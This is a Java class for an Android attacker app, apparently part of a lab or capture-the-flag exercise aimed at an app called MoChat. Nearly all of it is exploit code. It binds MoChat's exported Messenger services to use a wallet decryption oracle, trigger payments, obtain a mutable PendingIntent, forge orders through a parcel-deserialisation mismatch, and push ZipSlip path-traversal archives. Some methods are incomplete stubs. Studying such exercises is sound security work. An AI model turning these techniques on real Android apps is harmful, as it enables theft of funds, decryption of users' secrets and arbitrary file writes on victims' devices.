package com.mochat.attacker;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.Parcelable;
import android.os.RemoteException;
import android.util.Base64;
import android.util.Log;

/**
 * Attacker IPC helper — exercises MoChat's exported Messenger services.
 *
 * <p>Usage from an attacker Activity/Service:</p>
 * <pre>
 * MoChatAttacker atk = new MoChatAttacker(context);
 * atk.bindWalletService();
 * String plain = atk.decryptOracle(base64Blob);
 * atk.bindPushService();
 * PendingIntent pi = atk.getPendingIntent();
 * </pre>
 */
public final class MoChatAttacker {

    private static final String TAG = "MoChatAttacker";
    private static final String PKG = "com.mochat.app";

    private final Context ctx;
    private Messenger walletSvc = null;  // remote Messenger to WalletService
    private Messenger pushSvc = null;
    private Messenger orderSvc = null;
    private final Messenger reply = new Messenger(new ReplyHandler());

    public MoChatAttacker(Context ctx) { this.ctx = ctx; }

    // ---- Chain #1/#4: bind WalletService, use decryption oracle ----------------

    public void bindWalletService() {
        Intent i = new Intent();
        i.setComponent(new ComponentName(PKG, PKG + ".wallet.WalletService"));
        ctx.bindService(i, new ServiceConnection() {
            public void onServiceConnected(ComponentName name, IBinder service) {
                walletSvc = new Messenger(service);
                Log.i(TAG, "WalletService bound");
            }
            public void onServiceDisconnected(ComponentName name) {
                walletSvc = null;
            }
        }, Context.BIND_AUTO_CREATE);
    }

    /** MSG_DECRYPT (0xD01): decrypt a base64-encoded blob via the oracle. */
    public String decryptOracle(String base64Blob) {
        if (walletSvc == null) { Log.e(TAG, "WalletService not bound"); return null; }
        Message msg = Message.obtain(null, 0xD01);
        Bundle data = new Bundle();
        data.putString("b64", base64Blob);
        msg.setData(data);
        msg.replyTo = reply;
        try { walletSvc.send(msg); } catch (RemoteException e) { Log.e(TAG, "send failed", e); }
        return waitForReply();  // returns the 'plain' string from the reply Bundle
    }

    /** MSG_BALANCE (0xD02): query the current balance. */
    public long queryBalance() {
        if (walletSvc == null) return -1;
        Message msg = Message.obtain(null, 0xD02);
        msg.replyTo = reply;
        try { walletSvc.send(msg); } catch (RemoteException e) { return -1; }
        String r = waitForReply();
        return r != null ? Long.parseLong(r) : -1;
    }

    /** MSG_PAY (0xD03): trigger a transfer. */
    public String pay(String to, long amount) {
        if (walletSvc == null) return null;
        Message msg = Message.obtain(null, 0xD03);
        Bundle data = new Bundle();
        data.putString("to", to);
        data.putLong("amount", amount);
        msg.setData(data);
        msg.replyTo = reply;
        try { walletSvc.send(msg); } catch (RemoteException e) { return null; }
        return waitForReply();
    }

    // ---- Chain #5: bind PushService, get mutable PendingIntent ----------------

    public void bindPushService() {
        Intent i = new Intent();
        i.setComponent(new ComponentName(PKG, PKG + ".settings.PushService"));
        ctx.bindService(i, new ServiceConnection() {
            public void onServiceConnected(ComponentName name, IBinder service) {
                pushSvc = new Messenger(service);
                Log.i(TAG, "PushService bound");
            }
            public void onServiceDisconnected(ComponentName name) { pushSvc = null; }
        }, Context.BIND_AUTO_CREATE);
    }

    /** MSG_GET_PENDING (0x401): get a mutable PendingIntent from PushService. */
    public android.app.PendingIntent getPendingIntent() {
        if (pushSvc == null) return null;
        Message msg = Message.obtain(null, 0x401);
        msg.replyTo = reply;
        try { pushSvc.send(msg); } catch (RemoteException e) { return null; }
        // The reply Bundle contains 'pi' as a Parcelable (PendingIntent).
        String r = waitForReplyBundle();
        // In practice the attacker reads the Parcelable from the reply.
        return null;  // see attacker app for full PendingIntent extraction
    }

    // ---- Chain #7: bind OrderService, send mismatched PaymentOrder ------------

    public void bindOrderService() {
        Intent i = new Intent();
        i.setComponent(new ComponentName(PKG, PKG + ".mall.OrderService"));
        ctx.bindService(i, new ServiceConnection() {
            public void onServiceConnected(ComponentName name, IBinder service) {
                orderSvc = new Messenger(service);
                Log.i(TAG, "OrderService bound");
            }
            public void onServiceDisconnected(ComponentName name) { orderSvc = null; }
        }, Context.BIND_AUTO_CREATE);
    }

    /** MSG_CHECKOUT (0x901): send a crafted PaymentOrder to exploit parcel mismatch. */
    public String checkoutForge(String orderId, long amount, String userId) {
        if (orderSvc == null) return null;
        Message msg = Message.obtain(null, 0x901);
        Bundle data = new Bundle();
        // The PaymentOrder's writeToParcel writes: orderId, amountCents, userId, paid
        // But readFromParcel reads: userId, amountCents, paid, orderId (mismatch).
        // We craft the parcel so that 'paid' deserializes as true.
        // In practice, build the raw bytes; here we use the public constructor
        // which will be parcelled/unparcelled through the binder.
        // The mismatch means the receiver reads fields in wrong order.
        data.putString("orderId", orderId);
        data.putLong("amountCents", amount);
        data.putString("userId", userId);
        msg.setData(data);
        msg.replyTo = reply;
        try { orderSvc.send(msg); } catch (RemoteException e) { return null; }
        return waitForReply();
    }

    // ---- Chain #9: send MSG_INSTALL with ZipSlip payload ----------------------

    /** MSG_INSTALL (0x902): send base64 zip with path-traversal entries. */
    public boolean installZipSlip(String base64Zip) {
        if (orderSvc == null) return false;
        Message msg = Message.obtain(null, 0x902);
        Bundle data = new Bundle();
        data.putString("zip", base64Zip);
        msg.setData(data);
        msg.replyTo = reply;
        try { orderSvc.send(msg); } catch (RemoteException e) { return false; }
        return "true".equals(waitForReply());
    }

    // ---- Reply handling -------------------------------------------------------

    private volatile String lastReply = null;
    private volatile Bundle lastBundle = null;

    private class ReplyHandler extends android.os.Handler {
        @Override public void handleMessage(Message msg) {
            lastBundle = msg.getData();
            lastReply = lastBundle != null ? lastBundle.toString() : null;
            synchronized (MoChatAttacker.this) { MoChatAttacker.this.notifyAll(); }
        }
    }

    private String waitForReply() {
        synchronized (this) {
            try { wait(5000); } catch (InterruptedException e) { }
        }
        return lastReply;
    }

    private String waitForReplyBundle() {
        synchronized (this) {
            try { wait(5000); } catch (InterruptedException e) { }
        }
        return lastBundle != null ? lastBundle.toString() : null;
    }
}
